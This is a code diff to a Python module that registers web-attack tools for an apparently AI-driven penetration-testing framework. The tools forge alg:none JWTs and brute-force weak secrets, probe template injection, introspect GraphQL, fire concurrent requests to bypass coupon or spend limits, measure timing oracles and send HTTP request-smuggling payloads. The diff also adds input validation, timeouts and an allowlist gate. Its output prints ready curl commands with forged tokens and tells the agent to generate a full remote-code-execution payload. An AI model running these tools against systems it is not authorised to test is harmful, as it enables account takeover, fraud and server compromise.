@@ -27,6 +27,144 @@ from tools.attack_modules.modules.web import (
     TimingOracle as TimingOracleModule,
 )
 from tools.mcp_tools.registry import ToolContext
+from tools.validation_utils import validate_target_or_ip
+
+_MIN_PORT = 1
+_MAX_PORT = 65535
+_MIN_CONCURRENT = 2
+_MAX_CONCURRENT = 100
+_MIN_TOOL_TIMEOUT = 5
+_MAX_TOOL_TIMEOUT = 300
+_DEFAULT_TOOL_TIMEOUT = 90
+_MAX_OUTPUT_CHARS = 20000
+_MAX_ENDPOINT_CHARS = 2048
+
+
+def _has_crlf(value: str) -> bool:
+    """True when ``value`` contains CR/LF (HTTP request-line/header injection)."""
+    return "\r" in value or "\n" in value
+
+
+def _check_target(target_ip: Any) -> tuple[str | None, str]:
+    """Validate ``target_ip`` syntax (non-empty, no CR/LF, IP-or-domain).
+
+    Returns ``(stripped_target, "")`` or ``(None, error)``. Syntax pre-gate
+    only — authorization stays with ``@require_allowlist`` (the gate sees the
+    full input; nothing is truncated here).
+    """
+    if not isinstance(target_ip, str) or not target_ip.strip():
+        return None, "BLOCKED: target_ip is required."
+    if _has_crlf(target_ip):
+        return None, "BLOCKED: target_ip must not contain CR/LF characters."
+    tip = target_ip.strip()
+    if not validate_target_or_ip(tip):
+        return None, "BLOCKED: target_ip must be a valid IP address or domain."
+    return tip, ""
+
+
+def _check_port(port: Any) -> tuple[int | None, str]:
+    """Validate a TCP port (1-65535). Returns ``(port, "")`` or ``(None, error)``."""
+    candidate: Any = port
+    if isinstance(candidate, str):
+        candidate = candidate.strip()
+        if not candidate.isdigit():
+            return None, "BLOCKED: port must be an integer between 1 and 65535."
+        candidate = int(candidate)
+    if isinstance(candidate, bool) or not isinstance(candidate, int):
+        return None, "BLOCKED: port must be an integer between 1 and 65535."
+    if candidate < _MIN_PORT or candidate > _MAX_PORT:
+        return None, "BLOCKED: port must be an integer between 1 and 65535."
+    return candidate, ""
+
+
+def _check_concurrent(value: Any) -> tuple[int | None, str]:
+    """Validate the race-request fan-out (2-100). Returns ``(n, "")`` or ``(None, error)``."""
+    candidate: Any = value
+    if isinstance(candidate, str):
+        candidate = candidate.strip()
+        if not candidate.isdigit():
+            return None, f"BLOCKED: concurrent must be an integer between {_MIN_CONCURRENT} and {_MAX_CONCURRENT}."
+        candidate = int(candidate)
+    if isinstance(candidate, bool) or not isinstance(candidate, int):
+        return None, f"BLOCKED: concurrent must be an integer between {_MIN_CONCURRENT} and {_MAX_CONCURRENT}."
+    if candidate < _MIN_CONCURRENT or candidate > _MAX_CONCURRENT:
+        return None, f"BLOCKED: concurrent must be between {_MIN_CONCURRENT} and {_MAX_CONCURRENT}."
+    return candidate, ""
+
+
+def _check_endpoint(endpoint: Any) -> tuple[str | None, str]:
+    """Validate an HTTP request path (absolute, no CR/LF/whitespace).
+
+    Returns ``(path, "")`` or ``(None, error)``. The path is interpolated
+    into the raw request line, so CR/LF or whitespace would be header
+    injection — reject, never sanitize.
+    """
+    if not isinstance(endpoint, str):
+        return None, "BLOCKED: endpoint must be an absolute path starting with '/'."
+    ep = endpoint.strip()
+    if not ep or not ep.startswith("/"):
+        return None, "BLOCKED: endpoint must be an absolute path starting with '/'."
+    if _has_crlf(ep):
+        return None, "BLOCKED: endpoint must not contain CR/LF characters."
+    if re.search(r"\s", ep):
+        return None, "BLOCKED: endpoint must not contain whitespace."
+    if len(ep) > _MAX_ENDPOINT_CHARS:
+        return None, f"BLOCKED: endpoint is too long (max {_MAX_ENDPOINT_CHARS} chars)."
+    return ep, ""
+
+
+def _clamp_timeout(timeout: Any) -> int:
+    """Clamp a tool deadline to [_MIN_TOOL_TIMEOUT, _MAX_TOOL_TIMEOUT] seconds."""
+    try:
+        if isinstance(timeout, bool):
+            raise ValueError("bool is not a timeout")
+        value = int(timeout) if not isinstance(timeout, int) else timeout
+    except (TypeError, ValueError):
+        return _DEFAULT_TOOL_TIMEOUT
+    return max(_MIN_TOOL_TIMEOUT, min(_MAX_TOOL_TIMEOUT, value))
+
+
+def _http_host(target_ip: str) -> str:
+    """Host-header value for ``target_ip`` (brackets IPv6 literals)."""
+    t = target_ip.strip()
+    if ":" in t and not t.startswith("["):
+        return f"[{t}]"
+    return t
+
+
+def _open_connection(host: str, port: int, timeout: float) -> Any:
+    """Open a TCP connection usable as a context manager (IPv4/IPv6/domain).
+
+    ``socket.create_connection`` resolves domains and tries each resolved
+    address, so IPv6 literals and FQDNs work (plain ``AF_INET`` + ``connect``
+    did not). Callers must use ``with`` so the socket always closes.
+    """
+    import socket as _sock
+
+    return _sock.create_connection((host, port), timeout=timeout)
+
+
+def _sock_budget(default: float, deadline: float) -> float:
+    """Per-connection socket timeout honoring the tool deadline (<=0 = expired)."""
+    remaining = deadline - time.monotonic()
+    if remaining <= 0:
+        return 0.0
+    return max(1.0, min(default, remaining))
+
+
+def _preview(value: str, limit: int) -> str:
+    """Display preview of ``value`` cut to ``limit`` chars with a marker."""
+    if len(value) <= limit:
+        return value
+    return value[:limit] + "... [truncated]"
+
+
+def _finish(lines: list[str]) -> str:
+    """Join result lines, cutting only the display tail (marked) when huge."""
+    text = "\n".join(lines)
+    if len(text) > _MAX_OUTPUT_CHARS:
+        text = text[:_MAX_OUTPUT_CHARS] + "\n[truncated]"
+    return text
 
 
 def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
@@ -40,22 +178,45 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
 
     @mcp.tool()
     @require_allowlist()
-    def jwt_tamper(target_ip: str, jwt_token: str = "") -> str:
-        """Test JWT tokens for algorithm confusion (alg:none), HMAC key confusion, and weak secret brute-force. Provide a JWT token or leave empty to auto-discover from common endpoints."""
-        if not target_ip or not target_ip.strip():
-            return "BLOCKED: target_ip is required."
+    def jwt_tamper(target_ip: str, jwt_token: str = "", timeout: int = 90) -> str:
+        """Test JWT tokens for algorithm confusion (alg:none), HMAC key confusion, and weak secret brute-force.
+
+        Args:
+            target_ip: Target host (IP or domain, must be allowlisted). Used only
+                for token auto-discovery when ``jwt_token`` is empty.
+            jwt_token: JWT to analyze (``header.payload.signature``). When empty,
+                the tool probes common login/token endpoints for a token.
+            timeout: Overall tool deadline in seconds (clamped 5-300).
+
+        Returns:
+            JWT_TAMPER_RESULTS envelope with discovery notes, alg:none
+            material, and weak-secret findings.
+
+        Gates:
+            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
+            target syntax + CR/LF pre-gates before any socket opens.
+
+        Side-effects:
+            Network: TCP reads against target_ip:80 only during discovery.
+        """
+        tip, err = _check_target(target_ip)
+        if err or tip is None:
+            return err
+        host: str = tip
+        if jwt_token and _has_crlf(jwt_token):
+            return "BLOCKED: jwt_token must not contain CR/LF characters."
+        deadline = time.monotonic() + _clamp_timeout(timeout)
 
         import base64 as _b64
         import hashlib as _hashlib
         import hmac as _hmac
 
-        result_lines = [f"JWT_TAMPER_RESULTS: {target_ip}", ""]
+        result_lines = [f"JWT_TAMPER_RESULTS: {host}", ""]
 
         # If no token provided, try to discover one
         token = jwt_token.strip() if jwt_token else ""
         if not token:
-            import socket as _sock
-
+            host_hdr = _http_host(host)
             # Phase 4: expanded discovery paths (Keycloak, WordPress, OAuth)
             for path in [
                 "/api/auth/login",
@@ -73,26 +234,31 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 "/wp-json/jwt-auth/v1/token",
                 "/.well-known/openid-configuration",
             ]:
+                if time.monotonic() >= deadline:
+                    result_lines.append("Discovery stopped at tool deadline (partial coverage).")
+                    break
                 try:
-                    with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
-                        s.settimeout(5)
-                        s.connect((target_ip, 80))
-                        s.sendall(f"GET {path} HTTP/1.0\r\nHost: {target_ip}\r\n\r\n".encode())
+                    budget = _sock_budget(5.0, deadline)
+                    if budget <= 0:
+                        result_lines.append("Discovery stopped at tool deadline (partial coverage).")
+                        break
+                    with _open_connection(host, 80, budget) as s:
+                        s.sendall(f"GET {path} HTTP/1.0\r\nHost: {host_hdr}\r\n\r\n".encode())
                         resp = s.recv(8192).decode(errors="replace")
                         match = re.search(r"[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}", resp)
                         if match:
                             token = match.group(0)
-                            result_lines.append(f"Discovered JWT at {path}: {token[:60]}...")
+                            result_lines.append(f"Discovered JWT at {path}: {_preview(token, 60)}")
                             break
                 except Exception:  # ponytail: bare except intentional
                     pass
 
         if not token:
-            return "\n".join(result_lines) + "\nNo JWT token found. Provide one via jwt_token parameter."
+            return _finish(result_lines) + "\nNo JWT token found. Provide one via jwt_token parameter."
 
         parts = token.split(".")
         if len(parts) != 3:
-            return "\n".join(result_lines) + "\nInvalid JWT format (expected header.payload.signature)."
+            return _finish(result_lines) + "\nInvalid JWT format (expected header.payload.signature)."
 
         def _b64url_decode(data: str) -> bytes:
             data = data.replace("-", "+").replace("_", "/")
@@ -117,8 +283,8 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
         none_header = dict(header)
         none_header["alg"] = "none"
         none_token = f"{_b64url_encode(json.dumps(none_header).encode())}.{parts[1]}."
-        result_lines.append(f"None-alg token: {none_token[:80]}...")
-        result_lines.append("To test: curl -H 'Authorization: Bearer " + none_token + f"' http://{target_ip}/api/me")
+        result_lines.append(f"None-alg token: {_preview(none_token, 80)}")
+        result_lines.append("To test: curl -H 'Authorization: Bearer " + none_token + f"' http://{host}/api/me")
 
         # Test 2: Weak HMAC secrets
         result_lines.append("")
@@ -192,19 +358,43 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 "If RSA public key is exposed (/.well-known/jwks.json), change alg to HS256 and sign with the public key as HMAC secret."
             )
 
-        return "\n".join(result_lines)
+        return _finish(result_lines)
 
     @mcp.tool()
     @require_allowlist()
-    def ssti_probe(target_ip: str, port: int = 80) -> str:
-        """Probe for Server-Side Template Injection (SSTI) across Jinja2, Twig, Freemarker, Velocity, Smarty, and Mako engines. Tests math payloads and reports which engine is detected."""
-        if not target_ip or not target_ip.strip():
-            return "BLOCKED: target_ip is required."
+    def ssti_probe(target_ip: str, port: int = 80, timeout: int = 90) -> str:
+        """Probe for Server-Side Template Injection (SSTI) across Jinja2, Twig, Freemarker, Velocity, Smarty, and Mako engines.
 
-        import socket as _sock
+        Args:
+            target_ip: Target host (IP or domain, must be allowlisted).
+            port: Target TCP port (1-65535).
+            timeout: Overall tool deadline in seconds (clamped 5-300); the
+                endpoint/param/payload sweep stops early when it expires.
+
+        Returns:
+            SSTI_PROBE_RESULTS envelope with the detected engine (if any).
+
+        Gates:
+            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
+            target syntax + CR/LF and port range pre-gates before any socket.
+
+        Side-effects:
+            Network: opens TCP connections to target_ip:port (read-only GETs).
+        """
+        tip, err = _check_target(target_ip)
+        if err or tip is None:
+            return err
+        host: str = tip
+        port_num, err = _check_port(port)
+        if err or port_num is None:
+            return err
+        dport: int = port_num
+        deadline = time.monotonic() + _clamp_timeout(timeout)
+
         import urllib.parse as _urlparse
 
-        result_lines = [f"SSTI_PROBE_RESULTS: {target_ip}:{port}", ""]
+        host_hdr = _http_host(host)
+        result_lines = [f"SSTI_PROBE_RESULTS: {host}:{dport}", ""]
 
         math_payloads = [
             ("{{7*7}}", "49", "Jinja2/Twig"),
@@ -264,15 +454,21 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
         ]
 
         found_engine = None
+        stopped_early = False
         for ep in endpoints:
             for param in params:
                 for payload, expected, engine in math_payloads:
+                    if time.monotonic() >= deadline:
+                        stopped_early = True
+                        break
                     try:
-                        with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
-                            s.settimeout(5)
+                        budget = _sock_budget(5.0, deadline)
+                        if budget <= 0:
+                            stopped_early = True
+                            break
+                        with _open_connection(host, dport, budget) as s:
                             path = f"{ep}?{param}={_urlparse.quote(payload)}"
-                            s.connect((target_ip, port))
-                            s.sendall(f"GET {path} HTTP/1.0\r\nHost: {target_ip}\r\n\r\n".encode())
+                            s.sendall(f"GET {path} HTTP/1.0\r\nHost: {host_hdr}\r\n\r\n".encode())
                             resp = s.recv(8192).decode(errors="replace")
                             if expected in resp:
                                 result_lines.append(f"[DETECTED] {engine} at {ep}?{param}=<payload>")
@@ -281,11 +477,13 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
                                 break
                     except Exception:  # ponytail: bare except intentional
                         pass
-                if found_engine:
+                if found_engine or stopped_early:
                     break
-            if found_engine:
+            if found_engine or stopped_early:
                 break
 
+        if stopped_early and not found_engine:
+            result_lines.append("Sweep stopped at tool deadline (partial coverage).")
         if not found_engine:
             result_lines.append("No SSTI detected on common endpoints.")
         else:
@@ -293,18 +491,42 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
             result_lines.append(f"Engine: {found_engine}")
             result_lines.append("Use write_python_file to generate a full RCE payload for this engine.")
 
-        return "\n".join(result_lines)
+        return _finish(result_lines)
 
     @mcp.tool()
     @require_allowlist()
-    def graphql_introspect(target_ip: str, port: int = 80) -> str:
-        """Extract GraphQL schema via introspection query. Tests for query depth abuse, batching attacks, and alias-based resource exhaustion."""
-        if not target_ip or not target_ip.strip():
-            return "BLOCKED: target_ip is required."
+    def graphql_introspect(target_ip: str, port: int = 80, timeout: int = 90) -> str:
+        """Extract GraphQL schema via introspection query.
 
-        import socket as _sock
+        Args:
+            target_ip: Target host (IP or domain, must be allowlisted).
+            port: Target TCP port (1-65535).
+            timeout: Overall tool deadline in seconds (clamped 5-300).
 
-        result_lines = [f"GRAPHQL_INTROSPECT_RESULTS: {target_ip}:{port}", ""]
+        Returns:
+            GRAPHQL_INTROSPECT_RESULTS envelope with the endpoint found (if
+            any), exposed type names (capped at 20), and a batching verdict.
+
+        Gates:
+            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
+            target syntax + CR/LF and port range pre-gates before any socket.
+
+        Side-effects:
+            Network: opens TCP connections to target_ip:port (introspection +
+            batching POSTs). Sockets always close via context managers.
+        """
+        tip, err = _check_target(target_ip)
+        if err or tip is None:
+            return err
+        host: str = tip
+        port_num, err = _check_port(port)
+        if err or port_num is None:
+            return err
+        dport: int = port_num
+        deadline = time.monotonic() + _clamp_timeout(timeout)
+
+        host_hdr = _http_host(host)
+        result_lines = [f"GRAPHQL_INTROSPECT_RESULTS: {host}:{dport}", ""]
 
         intro_query = json.dumps(
             {
@@ -332,33 +554,40 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
         ]
         found = None
 
-        for ep in endpoints:
-            try:
-                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
-                    s.settimeout(8)
-                    s.connect((target_ip, port))
-                    body = intro_query.encode()
-                    req = (
-                        f"POST {ep} HTTP/1.0\r\n"
-                        f"Host: {target_ip}\r\n"
-                        f"Content-Type: application/json\r\n"
-                        f"Content-Length: {len(body)}\r\n"
-                        f"\r\n"
-                    ).encode() + body
-                    s.sendall(req)
-                    resp = s.recv(16384).decode(errors="replace")
+        def _post(ep: str, body: bytes, budget: float) -> str:
+            with _open_connection(host, dport, budget) as s:
+                req = (
+                    f"POST {ep} HTTP/1.0\r\n"
+                    f"Host: {host_hdr}\r\n"
+                    f"Content-Type: application/json\r\n"
+                    f"Content-Length: {len(body)}\r\n"
+                    f"\r\n"
+                ).encode() + body
+                s.sendall(req)
+                return s.recv(16384).decode(errors="replace")
 
-                    if "__schema" in resp or "queryType" in resp:
-                        found = ep
-                        result_lines.append(f"[+] GraphQL endpoint found: {ep}")
-                        result_lines.append("  Introspection ENABLED!")
-                        # Extract type names
-                        type_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', resp)
-                        if type_matches:
-                            result_lines.append(f"  Types exposed: {', '.join(type_matches[:20])}")
-                        break
-                    elif "graphql" in resp.lower() or "query" in resp.lower():
-                        result_lines.append(f"[?] Possible GraphQL at {ep} (introspection may be disabled)")
+        for ep in endpoints:
+            if time.monotonic() >= deadline:
+                result_lines.append("Endpoint sweep stopped at tool deadline (partial coverage).")
+                break
+            try:
+                budget = _sock_budget(8.0, deadline)
+                if budget <= 0:
+                    result_lines.append("Endpoint sweep stopped at tool deadline (partial coverage).")
+                    break
+                resp = _post(ep, intro_query.encode(), budget)
+
+                if "__schema" in resp or "queryType" in resp:
+                    found = ep
+                    result_lines.append(f"[+] GraphQL endpoint found: {ep}")
+                    result_lines.append("  Introspection ENABLED!")
+                    # Extract type names
+                    type_matches = re.findall(r'"name"\s*:\s*"([^"]+)"', resp)
+                    if type_matches:
+                        result_lines.append(f"  Types exposed: {', '.join(type_matches[:20])}")
+                    break
+                elif "graphql" in resp.lower() or "query" in resp.lower():
+                    result_lines.append(f"[?] Possible GraphQL at {ep} (introspection may be disabled)")
             except Exception:  # ponytail: bare except intentional
                 pass
 
@@ -367,6 +596,9 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
 
         # Batching test
         if found:
+            if time.monotonic() >= deadline:
+                result_lines.append("Batching test skipped at tool deadline.")
+                return _finish(result_lines)
             result_lines.append("")
             result_lines.append("--- Batching attack test ---")
             batch_body = json.dumps(
@@ -379,19 +611,20 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 ]
             ).encode()
             try:
-                s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
-                s.settimeout(8)
-                s.connect((target_ip, port))
-                req = (
-                    f"POST {found} HTTP/1.0\r\n"
-                    f"Host: {target_ip}\r\n"
-                    f"Content-Type: application/json\r\n"
-                    f"Content-Length: {len(batch_body)}\r\n"
-                    f"\r\n"
-                ).encode() + batch_body
-                s.sendall(req)
-                resp = s.recv(8192).decode(errors="replace")
-                s.close()
+                budget = _sock_budget(8.0, deadline)
+                if budget <= 0:
+                    result_lines.append("Batching test skipped at tool deadline.")
+                    return _finish(result_lines)
+                with _open_connection(host, dport, budget) as s:
+                    req = (
+                        f"POST {found} HTTP/1.0\r\n"
+                        f"Host: {host_hdr}\r\n"
+                        f"Content-Type: application/json\r\n"
+                        f"Content-Length: {len(batch_body)}\r\n"
+                        f"\r\n"
+                    ).encode() + batch_body
+                    s.sendall(req)
+                    resp = s.recv(8192).decode(errors="replace")
                 if resp.count("__typename") >= 5:
                     result_lines.append("[+] Batching ENABLED! Multiple queries processed in one request.")
                 else:
@@ -399,36 +632,79 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
             except Exception:  # ponytail: bare except intentional
                 result_lines.append("Batching test failed.")
 
-        return "\n".join(result_lines)
+        return _finish(result_lines)
 
     @mcp.tool()
     @require_allowlist()
-    def race_request(target_ip: str, port: int = 80, endpoint: str = "/api/redeem", concurrent: int = 20) -> str:
-        """Send N concurrent HTTP requests to exploit TOCTOU race conditions. Tests for coupon/limit bypass, double-spend, and rate-limit evasion. Use concurrent=20-100 for best results."""
-        if not target_ip or not target_ip.strip():
-            return "BLOCKED: target_ip is required."
-        if concurrent < 2 or concurrent > 200:
-            return "BLOCKED: concurrent must be between 2 and 200."
+    def race_request(
+        target_ip: str,
+        port: int = 80,
+        endpoint: str = "/api/redeem",
+        concurrent: int = 20,
+        timeout: int = 90,
+    ) -> str:
+        """Send N concurrent HTTP requests to exploit TOCTOU race conditions.
+
+        Args:
+            target_ip: Target host (IP or domain, must be allowlisted).
+            port: Target TCP port (1-65535).
+            endpoint: Absolute request path starting with '/' (no CR/LF or
+                whitespace — it is interpolated into the raw request line).
+            concurrent: Parallel requests (2-100).
+            timeout: Overall tool deadline in seconds (clamped 5-300).
+
+        Returns:
+            RACE_REQUEST_RESULTS envelope with success/failure counts and a
+            mixed-status verdict.
+
+        Gates:
+            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
+            target/port/endpoint/concurrent shape pre-gates before any socket.
+
+        Side-effects:
+            Network: opens up to ``concurrent`` TCP connections to
+            target_ip:port (state-changing POSTs by design).
+        """
+        tip, err = _check_target(target_ip)
+        if err or tip is None:
+            return err
+        host: str = tip
+        port_num, err = _check_port(port)
+        if err or port_num is None:
+            return err
+        dport: int = port_num
+        ep, err = _check_endpoint(endpoint)
+        if err or ep is None:
+            return err
+        path: str = ep
+        workers, err = _check_concurrent(concurrent)
+        if err or workers is None:
+            return err
+        fanout: int = workers
+        deadline = time.monotonic() + _clamp_timeout(timeout)
 
         import concurrent.futures as _cf
-        import socket as _sock
         import threading as _thr
 
-        result_lines = [f"RACE_REQUEST_RESULTS: {target_ip}:{port}{endpoint}", ""]
-        result_lines.append(f"Concurrent requests: {concurrent}")
+        host_hdr = _http_host(host)
+        result_lines = [f"RACE_REQUEST_RESULTS: {host}:{dport}{path}", ""]
+        result_lines.append(f"Concurrent requests: {fanout}")
 
         results = {"success": 0, "failure": 0, "statuses": []}
         lock = _thr.Lock()
 
         def _send_one() -> dict:
             try:
-                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
-                    s.settimeout(8)
-                    s.connect((target_ip, port))
+                budget = _sock_budget(8.0, deadline)
+                if budget <= 0:
+                    with lock:
+                        results["failure"] += 1
+                    return {"error": "tool deadline reached"}
+                with _open_connection(host, dport, budget) as s:
                     body = json.dumps({"code": "TEST100", "user": "attacker"}).encode()
                     req = (
-                        f"POST {endpoint} HTTP/1.0\r\n"
-                        f"Host: {target_ip}\r\n"
+                        f"POST {path} HTTP/1.0\r\n"
+                        f"Host: {host_hdr}\r\n"
                         f"Content-Type: application/json\r\n"
                         f"Content-Length: {len(body)}\r\n"
                         f"\r\n"
@@ -449,9 +725,15 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
                 return {"error": str(e)}
 
         start = time.monotonic()
-        with _cf.ThreadPoolExecutor(max_workers=min(concurrent, 50)) as executor:
-            futures = [executor.submit(_send_one) for _ in range(concurrent)]
-            _cf.wait(futures, timeout=30)
+        with _cf.ThreadPoolExecutor(max_workers=min(fanout, 50)) as executor:
+            futures = [executor.submit(_send_one) for _ in range(fanout)]
+            wait_for = _sock_budget(60.0, deadline)
+            if wait_for <= 0:
+                wait_for = 1.0
+            _cf.wait(futures, timeout=wait_for)
+            for fut in futures:
+                if not fut.done():
+                    fut.cancel()
 
         elapsed = time.monotonic() - start
         result_lines.append(f"Completed in {elapsed:.1f}s")
@@ -463,31 +745,59 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
         if results["success"] > 1:
             result_lines.append(f"[!] {results['success']} requests succeeded — limit may be bypassed!")
 
-        return "\n".join(result_lines)
+        return _finish(result_lines)
 
     @mcp.tool()
     @require_allowlist()
-    def timing_oracle(target_ip: str, port: int = 80) -> str:
-        """Detect timing side-channels in login, password reset, and token validation endpoints. Measures response time differences for user enumeration and blind data extraction."""
-        if not target_ip or not target_ip.strip():
-            return "BLOCKED: target_ip is required."
+    def timing_oracle(target_ip: str, port: int = 80, timeout: int = 90) -> str:
+        """Detect timing side-channels in login, password reset, and token validation endpoints.
 
-        import socket as _sock
+        Args:
+            target_ip: Target host (IP or domain, must be allowlisted).
+            port: Target TCP port (1-65535).
+            timeout: Overall tool deadline in seconds (clamped 5-300); sampling
+                stops early when it expires (reported as insufficient samples).
+
+        Returns:
+            TIMING_ORACLE_RESULTS envelope with mean-time comparisons.
+
+        Gates:
+            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
+            target syntax + CR/LF and port range pre-gates before any socket.
+
+        Side-effects:
+            Network: opens TCP connections to target_ip:port (login/reset
+            POSTs with dummy credentials).
+        """
+        tip, err = _check_target(target_ip)
+        if err or tip is None:
+            return err
+        host: str = tip
+        port_num, err = _check_port(port)
+        if err or port_num is None:
+            return err
+        dport: int = port_num
+        deadline = time.monotonic() + _clamp_timeout(timeout)
+
         import statistics as _stats
 
-        result_lines = [f"TIMING_ORACLE_RESULTS: {target_ip}:{port}", ""]
+        host_hdr = _http_host(host)
+        result_lines = [f"TIMING_ORACLE_RESULTS: {host}:{dport}", ""]
 
         def _measure(endpoint: str, body: str, samples: int = 8) -> list[float]:
             times = []
             for _ in range(samples):
+                if time.monotonic() >= deadline:
+                    break
                 try:
-                    with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
-                        s.settimeout(8)
-                        s.connect((target_ip, port))
+                    budget = _sock_budget(8.0, deadline)
+                    if budget <= 0:
+                        break
+                    with _open_connection(host, dport, budget) as s:
                         data = body.encode()
                         req = (
                             f"POST {endpoint} HTTP/1.0\r\n"
-                            f"Host: {target_ip}\r\n"
+                            f"Host: {host_hdr}\r\n"
                             f"Content-Type: application/json\r\n"
                             f"Content-Length: {len(data)}\r\n"
                             f"\r\n"
@@ -536,24 +846,49 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
         else:
             result_lines.append("  Insufficient samples.")
 
-        return "\n".join(result_lines)
+        return _finish(result_lines)
 
     @mcp.tool()
     @require_allowlist()
-    def request_smuggling_probe(target_ip: str, port: int = 80) -> str:
-        """Test for HTTP request smuggling (CL.TE, TE.CL, TE.TE). Can detect cache poisoning and request hijacking vulnerabilities."""
-        if not target_ip or not target_ip.strip():
-            return "BLOCKED: target_ip is required."
+    def request_smuggling_probe(target_ip: str, port: int = 80, timeout: int = 90) -> str:
+        """Test for HTTP request smuggling (CL.TE, TE.CL, TE.TE).
 
-        import socket as _sock
+        Args:
+            target_ip: Target host (IP or domain, must be allowlisted).
+            port: Target TCP port (1-65535).
+            timeout: Overall tool deadline in seconds (clamped 5-300); later
+                probes are skipped when it expires.
 
-        result_lines = [f"REQUEST_SMUGGLING_RESULTS: {target_ip}:{port}", ""]
+        Returns:
+            REQUEST_SMUGGLING_RESULTS envelope with per-technique verdicts.
+
+        Gates:
+            Declarative ``@require_allowlist`` on ``target_ip`` (full input);
+            target syntax + CR/LF and port range pre-gates before any socket.
+
+        Side-effects:
+            Network: opens TCP connections to target_ip:port sending
+            intentionally malformed requests (detection only).
+        """
+        tip, err = _check_target(target_ip)
+        if err or tip is None:
+            return err
+        host: str = tip
+        port_num, err = _check_port(port)
+        if err or port_num is None:
+            return err
+        dport: int = port_num
+        deadline = time.monotonic() + _clamp_timeout(timeout)
+
+        host_hdr = _http_host(host)
+        result_lines = [f"REQUEST_SMUGGLING_RESULTS: {host}:{dport}", ""]
 
         def _send_raw(payload: bytes) -> bytes:
             try:
-                with _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM) as s:
-                    s.settimeout(10)
-                    s.connect((target_ip, port))
+                budget = _sock_budget(10.0, deadline)
+                if budget <= 0:
+                    return b"ERROR: tool deadline reached"
+                with _open_connection(host, dport, budget) as s:
                     s.sendall(payload)
                     time.sleep(0.5)
                     resp = b""
@@ -563,39 +898,43 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
                             if not chunk:
                                 break
                             resp += chunk
-                    except _sock.timeout:
+                    except OSError:
                         pass
                     return resp
             except Exception as e:  # ponytail: bare except intentional
                 return f"ERROR: {e}".encode()
 
         # Baseline
-        baseline = _send_raw(f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 0\r\n\r\n".encode())
+        baseline = _send_raw(f"POST / HTTP/1.1\r\nHost: {host_hdr}\r\nContent-Length: 0\r\n\r\n".encode())
         result_lines.append(f"Baseline: {len(baseline)} bytes")
 
         # CL.TE test
         result_lines.append("")
         result_lines.append("--- CL.TE test ---")
         cl_te = (
-            f"POST / HTTP/1.1\r\nHost: {target_ip}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
+            f"POST / HTTP/1.1\r\nHost: {host_hdr}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
         ).encode()
         resp = _send_raw(cl_te)
         result_lines.append(f"Response: {len(resp)} bytes")
         if abs(len(resp) - len(baseline)) > 200:
             result_lines.append("[!] Response differs from baseline — possible CL.TE smuggling!")
 
+        if time.monotonic() >= deadline:
+            result_lines.append("Remaining probes skipped at tool deadline.")
+            return _finish(result_lines)
+
         # TE.CL test
         result_lines.append("")
         result_lines.append("--- TE.CL test ---")
         te_cl = (
             f"POST / HTTP/1.1\r\n"
-            f"Host: {target_ip}\r\n"
+            f"Host: {host_hdr}\r\n"
             f"Content-Length: 4\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"\r\n"
             f"5c\r\n"
             f"GPOST / HTTP/1.1\r\n"
-            f"Host: {target_ip}\r\n"
+            f"Host: {host_hdr}\r\n"
             f"Content-Length: 15\r\n"
             f"\r\n"
             f"x=1\r\n"
@@ -608,19 +947,23 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
         if "GPOST" in text or "Unrecognized method" in text:
             result_lines.append("[+] SMUGGLING CONFIRMED! Back-end saw smuggled 'GPOST' request!")
 
+        if time.monotonic() >= deadline:
+            result_lines.append("Remaining probes skipped at tool deadline.")
+            return _finish(result_lines)
+
         # TE.TE test
         result_lines.append("")
         result_lines.append("--- TE.TE test (obfuscated TE header) ---")
         te_te = (
             f"POST / HTTP/1.1\r\n"
-            f"Host: {target_ip}\r\n"
+            f"Host: {host_hdr}\r\n"
             f"Content-Length: 4\r\n"
             f"Transfer-Encoding: chunked\r\n"
             f"Transfer-encoding: x\r\n"
             f"\r\n"
             f"5c\r\n"
             f"GPOST / HTTP/1.1\r\n"
-            f"Host: {target_ip}\r\n"
+            f"Host: {host_hdr}\r\n"
             f"\r\n"
             f"0\r\n"
             f"\r\n"
@@ -631,18 +974,47 @@ def register_web_tools(mcp: Any, *, ctx: ToolContext) -> None:
         if "GPOST" in text:
             result_lines.append("[+] SMUGGLING CONFIRMED via TE.TE obfuscation!")
 
-        return "\n".join(result_lines)
+        return _finish(result_lines)
 
     @mcp.tool()
     @require_allowlist()
